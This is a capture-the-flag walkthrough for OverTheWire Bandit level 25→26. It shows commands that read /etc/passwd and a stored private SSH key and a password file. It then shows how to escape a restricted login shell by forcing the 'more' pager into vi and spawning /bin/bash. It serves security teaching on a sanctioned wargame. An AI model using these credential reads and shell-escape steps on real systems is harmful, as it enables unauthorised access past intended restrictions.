# Bandit Level 25 → Level 26

### Level Goal
Logging into **bandit26** from **bandit25** should be fairly easy…  
However, the shell for **bandit26** is **not `/bin/bash`**, but something else.  
Your task is to find out **what shell it uses**, **how it works**, and **how to break out of it**.

---

### Solution

```bash
cat /etc/passwd | grep bandit26
ls -la /usr/bin/showtext
cat /usr/bin/showtext    # shows that the shell runs 'more'
```

```bash
ls
cat bandit26.sshkey      # copy the private key
exit
```

SSH into bandit26 **using the key** and **shrink your terminal window** as small as possible so `more` triggers its pager behavior:

```bash
ssh -i bandit26.sshkey -p 2220 -l bandit26 bandit.labs.overthewire.org
```

When the `more` pager opens, press:

```
ESC
```

Then open the password file:

```
:e /etc/bandit_pass/bandit26
```

To escape from the restricted environment:

```vim
:set shell=/bin/bash
:shell
```
